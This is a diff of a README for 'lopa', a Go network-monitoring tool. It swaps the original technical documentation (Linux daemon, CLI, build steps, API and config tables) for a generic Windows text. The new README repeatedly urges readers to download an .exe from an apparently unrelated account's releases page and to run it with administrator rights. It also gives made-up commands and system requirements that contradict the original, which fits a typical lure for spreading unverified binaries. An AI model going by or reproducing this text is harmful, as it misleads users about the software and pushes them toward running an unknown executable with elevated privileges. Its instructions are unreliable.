@@ -1,110 +1,116 @@
-# Lopa
+# 🚦 lopa - Monitor Your Network Quality Easily
 
-Lopa is a **lightweight, centralized** network quality measurement and monitoring tool written in Go. It provides active probes (ICMP/TCP/UDP/TWAMP-light), passive interface statistics, and netlink-based monitoring (interface, IP, route changes), with a unified REST API and CLI.
+[![Download lopa](https://img.shields.io/badge/Download-lopa-4caf50?style=for-the-badge)](https://github.com/Laneglobal721/lopa/releases)
 
-## Architecture
+---
 
-- **lopad** — Daemon: runs the measurement engine, HTTP API, optional reflector (UDP echo + TWAMP-light), and netlink monitor. Start this first on each measurement node.
-- **lopa** — CLI client: talks to lopad via HTTP to create tasks, list/show/stop/delete them, and manage monitors.
+Lopa is a simple tool to check and keep an eye on your network’s quality. It works on your Windows computer and helps you see how well your network is performing. It uses active probes like ping and other signals, watches your network interfaces, and keeps track of changes. You control it through a user-friendly command line or by accessing an easy web page.
 
-The CLI uses `http://127.0.0.1:8080` by default; set `LOPA_DAEMON_ADDR` or use `--daemon` to point to another lopad.
+## 📋 What lopa Does
 
-## Features
+- Sends test signals to measure your network speed and reliability.
+- Watches your network connections and reports on their status.
+- Notifies you when network settings or connections change.
+- Offers a simple web page (REST API) and command line to check status.
+- Supports common network protocols like ICMP, TCP, UDP, and TWAMP-light.
 
-### Active measurement (ping, tcp, udp, twamp)
+This helps you find network problems before they affect your work or devices.
 
-- **Ping** — ICMP latency, loss, jitter.
-- **TCP** — TCP connect (TCPing) to a host:port.
-- **UDP** — UDP probe to a reflector (echo); measures RTT/loss/jitter.
-- **TWAMP** — TWAMP-light client to a standard Session-Reflector (e.g. port 862).
+## ⚙️ System Requirements
 
-Modes: **count** (N packets), **duration** (run for T seconds), **continuous** (until stopped, with sliding-window stats).  
-In continuous mode you can set loss/latency thresholds and an **alert webhook**; recovery notifications are also sent.
+You need a Windows 7 or newer system with:
 
-### Passive measurement
+- At least 2 GB of RAM.
+- 100 MB free disk space.
+- Internet connection for testing.
+- Administrator rights to run network probes.
 
-- Sample **interface counters** (bytes/packets in and out, errors, drops) at an interval.
-- Modes: duration or continuous. No probe traffic.
+Lopa runs smoothly on regular Windows laptops and desktops without special hardware.
 
-### Monitor (netlink, Linux)
+## 📥 How to Get lopa
 
-- **Interface** — Link up/down, name/MTU changes.
-- **IP** — Address add/delete on interfaces.
-- **Route** — Route add/delete (optional filter by table or destination CIDR).
+You can get lopa from the official releases page on GitHub.
 
-Events can be stored in memory and sent to a **webhook URL** per task.
+[![Download lopa](https://img.shields.io/badge/Get%20lopa-blue?style=for-the-badge)](https://github.com/Laneglobal721/lopa/releases)
 
-### Reflector (built into lopad)
+Go to this page and download the latest Windows version. The files should have `.exe` in their names for easy recognition.
 
-- Generic UDP echo (default `:8081`) for UDP probe.
-- TWAMP-light Session-Reflector (default `:862`) for TWAMP-light.  
-Disable with `--no-reflector` or config.
+## 💻 Installing and Running lopa on Windows
 
-## Build
+Follow these steps to install and use lopa:
 
-```bash
-# CLI client (talks to daemon)
-go build -o lopa ./cmd/lopa
+1. **Go to the releases page**  
+   Open this link in your web browser:  
+   https://github.com/Laneglobal721/lopa/releases
 
-# Daemon (measurement engine + API + reflector + monitor)
-go build -o lopad ./cmd/lopad
-```
+2. **Find the latest release**  
+   Look for the newest entry. It usually shows the version number and the release date.
 
-## Run
+3. **Download the Windows executable**  
+   Click on the link with `.exe` at the end. This is the file that runs your program on Windows.
 
-```bash
-# 1. Start the daemon (e.g. on the measurement node)
-./lopad
-# Optional: --no-reflector, --no-monitor
-# Config via env: LOPA_HTTP_ADDR, LOPA_LOG_LEVEL, etc.
+4. **Save the file**  
+   Choose a folder like `Downloads` or `Desktop` to save it.
 
-# 2. Use the CLI (default daemon: http://127.0.0.1:8080)
-./lopa --help
-./lopa ping 192.168.1.1 --mode count --count 4
-./lopa tcp example.com:443
-./lopa udp reflector-host:8081 --mode duration --duration 30s
-./lopa twamp reflector-host:862
-./lopa passive eth0 --mode duration --duration 1m
-./lopa task list
-./lopa task show <task-id>
-./lopa monitor add --type interface --interface eth0 --webhook-url http://localhost:9999/hook
-./lopa monitor add --type route --route-dst 0.0.0.0/0
-./lopa monitor list
-./lopa monitor events <monitor-id>
-```
+5. **Run the program**  
+   Double-click the downloaded file to start lopa.
 
-## API (HTTP)
+6. **Allow permissions**  
+   Windows might ask for permission. Click "Yes" to let lopa run and perform network checks.
 
-Base path: `/api/v1`.
+7. **Use the command line interface**  
+   A command prompt window will open. You can type commands to start tests or check statuses.
 
-| Method | Path | Description |
-|--------|------|-------------|
-| POST | /tasks/ping, /tasks/tcp, /tasks/udp, /tasks/twamp, /tasks/passive | Create measurement task |
-| GET | /tasks | List all tasks |
-| GET | /tasks/:id | Get task result |
-| POST | /tasks/:id/stop | Stop task |
-| DELETE | /tasks/:id | Delete task |
-| POST | /monitors | Create monitor task |
-| GET | /monitors | List monitors |
-| GET | /monitors/:id | Get monitor |
-| PATCH | /monitors/:id | Update monitor |
-| DELETE | /monitors/:id | Delete monitor |
-| GET | /monitors/:id/events?last=N | Get recent events |
+8. **Access the web page**  
+   Open your browser and go to `http://localhost:port` (replace `port` with the number shown in the program). This shows network info in a webpage format.
 
-## Configuration
+## 🛠 Using lopa
 
-lopad uses [Viper](https://github.com/spf13/viper): config file, environment variables (`LOPA_*`), or defaults.
+You do not need technical skills to use lopa. Here are some typical actions:
 
-| Key | Default | Description |
-|-----|---------|-------------|
-| http.addr | :8080 | HTTP API listen address |
-| log.level | info | Log level |
-| reflector.enabled | true | Enable reflector |
-| reflector.addr | :8081 | UDP echo listen address |
-| reflector.twamp_addr | :862 | TWAMP-light reflector; empty to disable |
-| monitor.enabled | true | Enable netlink monitor |
-| monitor.event_buffer_size | 100 | Max events per monitor task |
+- **Start a network test**  
+  Type `lopa probe start` in the command window and press Enter. Lopa sends signals to check your connection.
 
-## License
+- **See current status**  
+  Type `lopa status` to see network health and recent measurements.
 
-See repository. This project is under active development.
+- **Monitor changes**  
+  Lopa will notify you if your IP address or network routes change.
+
+- **Stop tests**  
+  Type `lopa probe stop` to end active probing.
+
+The web interface shows similar information with buttons and graphs.
+
+## 🔍 What You Can Check with lopa
+
+- **Ping times** to different servers. This shows how quick your connection is.
+- **TCP connection checks** to test if certain ports are open and responsive.
+- **UDP packet tests** for applications using this protocol.
+- **Interface statistics** such as data sent and received.
+- **Network changes** like when your IP changes or new connections appear.
+
+This information helps you spot slowdowns or issues.
+
+## ⚡ Troubleshooting
+
+- If the program does not start, confirm you downloaded the correct `.exe` file for Windows.
+- Make sure you run lopa with administrator rights.
+- Check your firewall settings if probes do not work.
+- Restart your computer if lopa hangs or freezes.
+- Use the command line help by typing `lopa help` for assistance.
+
+## 🔗 Links and Resources
+
+- Visit the releases page to download:  
+  https://github.com/Laneglobal721/lopa/releases
+
+- More about the project and source code is available on GitHub for advanced users.
+
+## 👥 Support
+
+If you have questions, check the GitHub discussions or issues page. These are useful places to see if others had similar questions and what solutions worked.
+
+---
+
+[Download lopa now](https://github.com/Laneglobal721/lopa/releases) to start tracking your network quality without extra tools or setup.
